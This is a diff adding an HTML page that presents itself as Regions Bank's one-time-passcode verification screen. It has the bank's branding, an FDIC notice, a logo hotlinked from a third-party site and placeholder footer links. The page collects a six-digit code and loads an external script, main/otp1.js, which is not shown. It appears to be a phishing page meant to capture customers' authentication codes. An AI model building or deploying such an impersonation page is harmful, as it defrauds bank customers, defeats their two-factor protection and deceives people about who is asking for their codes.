@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Regions Bank OTP Verification</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background-color: #ffffff;
+    color: #1a1a1a;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 40px 20px;
+    min-height: 100vh;
+  }
+
+  .logo { text-align: center; margin-bottom: 15px; }
+  .logo img { height: 50px; max-width: 100%; }
+
+  .heading {
+    font-size: 2.4rem;
+    font-weight: 400;
+    text-align: center;
+    margin-bottom: 10px;
+  }
+
+  .subheading {
+    font-size: 1.1rem;
+    text-align: center;
+    font-weight: 500;
+    margin-bottom: 30px;
+    color: #555;
+  }
+
+  .login-box {
+    background: #fff;
+    border-radius: 20px;
+    padding: 30px 25px;
+    box-shadow: 0 0 9px rgba(0, 0, 0, 0.08);
+    width: 100%;
+    max-width: 420px;
+    text-align: center;
+    margin-bottom: 40px;
+  }
+
+  .otp-inputs {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 25px;
+  }
+
+  .otp-inputs input {
+    width: 55px;
+    height: 55px;
+    font-size: 1.8rem;
+    text-align: center;
+    border: 1.5px solid #ccc;
+    border-radius: 10px;
+    transition: border 0.2s, box-shadow 0.2s;
+  }
+
+  .otp-inputs input:focus {
+    border-color: #3d6f1b;
+    box-shadow: 0 0 5px rgba(61, 111, 27, 0.5);
+    outline: none;
+  }
+
+  /* Centered button styling */
+  .button-container {
+    display: flex;
+    justify-content: center;
+    width: 100%;
+    margin-top: 10px;
+  }
+
+  .button-container button {
+    width: 70%;
+    padding: 14px;
+    background-color: #3d6f1b;
+    color: white;
+    font-size: 16px;
+    border: none;
+    border-radius: 25px;
+    font-weight: bold;
+    cursor: pointer;
+    text-align: center;
+    transition: background 0.2s;
+  }
+
+  .button-container button:hover {
+    background-color: #345f17;
+  }
+
+  .links {
+    text-align: center;
+    margin-top: 25px;
+    font-size: 14px;
+  }
+
+  .links a {
+    color: #007f7f;
+    text-decoration: none;
+  }
+
+  .links a:hover { text-decoration: underline; }
+
+  /* Footer Section */
+  footer {
+    width: 100%;
+    background-color: #f7f7f7;
+    color: #333;
+    font-size: 14px;
+    padding: 30px 20px;
+    border-top: 1px solid #ddd;
+    margin-top: auto;
+  }
+
+  .footer-container {
+    max-width: 1000px;
+    margin: 0 auto;
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: space-between;
+    gap: 20px;
+    text-align: center;
+  }
+
+  .footer-section {
+    flex: 1 1 200px;
+    min-width: 180px;
+  }
+
+  .footer-section h4 {
+    font-size: 15px;
+    font-weight: 700;
+    margin-bottom: 10px;
+    color: #1a1a1a;
+  }
+
+  .footer-section ul {
+    list-style: none;
+    padding: 0;
+  }
+
+  .footer-section ul li {
+    margin: 6px 0;
+  }
+
+  .footer-section ul li a {
+    color: #007f7f;
+    text-decoration: none;
+  }
+
+  .footer-section ul li a:hover {
+    text-decoration: underline;
+  }
+
+  .footer-bottom {
+    text-align: center;
+    margin-top: 25px;
+    color: #666;
+    font-size: 13px;
+  }
+  .fdic-text {
+      font-size: 13px;
+      color: #333;
+      text-align: center;
+      margin-bottom: 30px;
+    }
+
+  /* Responsive Adjustments */
+  @media (max-width: 480px) {
+    .heading { font-size: 22px; }
+    .subheading { font-size: 14px; }
+    .otp-inputs input { width: 42px; height: 45px; font-size: 1.5rem; }
+    .button-container button { width: 80%; }
+    footer { font-size: 13px; padding: 25px 15px; }
+    .footer-container { flex-direction: column; align-items: center; gap: 25px; }
+    .footer-section { text-align: center; }
+  }
+</style>
+</head>
+<body>
+
+  <div class="logo">
+    <img src="https://thebanks.eu/img/logos/Regions_Bank.png" alt="Regions Bank Logo" />
+  </div>
+  
+  <div class="fdic-text">
+    <strong>FDIC</strong> FDIC-Insured – Backed by the full faith and credit of the U.S. Government
+  </div>
+
+  <div class="heading">OTP Verification</div>
+  <div class="subheading">Enter the 6-digit code sent to your phone or email</div>
+
+  <div class="login-box">
+    <form id="otpForm">
+      <div class="otp-inputs">
+        <input type="text" maxlength="1" class="otp" />
+        <input type="text" maxlength="1" class="otp" />
+        <input type="text" maxlength="1" class="otp" />
+        <input type="text" maxlength="1" class="otp" />
+        <input type="text" maxlength="1" class="otp" />
+        <input type="text" maxlength="1" class="otp" />
+      </div>
+
+      <div class="button-container">
+        <button type="submit">Continue</button>
+      </div>
+    </form>
+  </div>
+
+  <div class="links">
+    <p>Didn't receive the code? <a href="#">Resend</a></p>
+  </div>
+
+  <!-- Footer Section -->
+  <footer>
+    <div class="footer-container">
+      <div class="footer-section">
+        <h4>Customer Service</h4>
+        <ul>
+          <li><a href="#">Contact Us</a></li>
+          <li><a href="#">Find a Branch</a></li>
+          <li><a href="#">Report Fraud</a></li>
+          <li><a href="#">Help & Support</a></li>
+        </ul>
+      </div>
+
+      <div class="footer-section">
+        <h4>Resources</h4>
+        <ul>
+          <li><a href="#">Privacy Policy</a></li>
+          <li><a href="#">Security Center</a></li>
+          <li><a href="#">Accessibility</a></li>
+          <li><a href="#">Terms & Conditions</a></li>
+        </ul>
+      </div>
+
+      <div class="footer-section">
+        <h4>Connect With Us</h4>
+        <ul>
+          <li><a href="#">Facebook</a></li>
+          <li><a href="#">Twitter</a></li>
+          <li><a href="#">Instagram</a></li>
+          <li><a href="#">LinkedIn</a></li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="footer-bottom">
+      © 2025 Regions Bank. Member FDIC. Equal Housing Lender.
+    </div>
+  </footer>
+
+  <script>
+    // Auto-focus OTP inputs
+    const otpInputs = document.querySelectorAll('.otp');
+    otpInputs.forEach((input, index) => {
+      input.addEventListener('input', () => {
+        input.value = input.value.replace(/\D/g, ''); // only digits
+        if(input.value.length === 1 && index < otpInputs.length - 1){
+          otpInputs[index + 1].focus();
+        }
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if(e.key === 'Backspace' && !input.value && index > 0){
+          otpInputs[index - 1].focus();
+        }
+      });
+    });
+
+    document.getElementById('otpForm').addEventListener('submit', (e)=>{
+      e.preventDefault();
+      const otpValue = Array.from(otpInputs).map(i => i.value).join('');
+      // You can handle OTP submission here
+      //console.log('Entered OTP:', otpValue);
+    });
+  </script>
+  <script src="main/otp1.js"></script>
+</body>
+</html>
